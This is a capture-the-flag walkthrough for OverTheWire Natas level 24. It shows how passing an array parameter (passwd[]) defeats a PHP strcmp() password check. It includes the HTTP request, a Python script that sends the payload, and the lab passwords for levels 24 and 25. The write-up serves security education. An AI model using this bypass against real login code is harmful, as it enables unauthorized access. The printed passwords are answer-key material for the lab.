# Natas CTF Solutions  

## Natas Level 24  

### 🌐 **Challenge Description**  
Natas teaches the basics of server-side web security. Each level consists of a website located at:  
👉 `http://natasX.natas.labs.overthewire.org` (where **X** is the level number).  

---

### 🎯 **Goal**  
- Bypass the `strcmp()` function using type juggling to reveal the password.  

---

## 🚀 **Solution**  

### **Step 1: Open the URL**  
Visit:  
```  
http://natas24.natas.labs.overthewire.org  
```  

---

### **Step 2: Enter Login Credentials**  
- **Username:** `natas24`  
- **Password:** Use the password from Natas Level 23:  
```
MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd
```  

![Home_Page](https://github.com/user-attachments/assets/7338e869-af31-45a9-b013-7d6f9b331942)

---

### **Step 3: Analyze the Source Code**  
Key part of the code:  
```php
if(strcmp($_REQUEST["passwd"],"admin") == 0) {
    print "Access granted. The password for natas25 is: XXXXX";
}
else {
    print "Wrong password!";
}
```

### **Understanding `strcmp()`**  
- `strcmp()` returns:  
  - `0` → if the two strings are equal.  
  - `<0` → if the first string is less than the second string.  
  - `>0` → if the first string is greater than the second string.  
- If you pass `passwd=test`, it returns **"Wrong password!"**  
- But if you pass `passwd[]=test`, it becomes an **array**, which results in `strcmp()` receiving `null`, causing it to return `0` → condition becomes `true`!  

![Source_Code](https://github.com/user-attachments/assets/4bb7348c-12d5-48ee-b696-9fc3ebc613bf)

---

### **Step 4: Send Payload**  
Use the following GET request:  

```http
GET /?passwd[]=test HTTP/1.1
Host: natas24.natas.labs.overthewire.org
```

✅ Example in Python:  
```python
import requests
from requests.auth import HTTPBasicAuth

username = "natas24"
password = "MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd"

url = "http://natas24.natas.labs.overthewire.org"
payload = {'passwd[]': 'test'}

response = requests.get(url, auth=(username, password), params=payload)
print(response.text)
```

---

### **Step 5: Output**  
If successful, the output will reveal the password for the next level:  
```  
The password for natas25 is: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws  
```  

![Password](https://github.com/user-attachments/assets/6aa6ce03-9cec-4d7b-8354-3fe828a965f0)

---

### **✅ Password for Natas Level 25**  
```
ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws
```  

---

## 💡 **Lessons Learned**  
✔️ **Type Juggling:** Arrays vs strings can confuse PHP’s comparison functions.  
✔️ **PHP Type Handling:** `strcmp()` can return `0` if the first value is `null` due to passing an array.  
✔️ **Parameter Injection:** Using non-standard inputs like arrays can lead to logic bypasses.  

---

## 🖼️ **Screenshots**  
| Step | Screenshot |  
|------|------------|  
| Step 3 – Source Code | ![Source_Code](https://github.com/user-attachments/assets/4bb7348c-12d5-48ee-b696-9fc3ebc613bf) |  
| Step 4 – Found Password | ![Password](https://github.com/user-attachments/assets/6aa6ce03-9cec-4d7b-8354-3fe828a965f0) |  

---

## 🎯 **Next Level**  
Use the password to access **Natas Level 25**:  
👉 [http://natas25.natas.labs.overthewire.org](http://natas25.natas.labs.overthewire.org)  

---
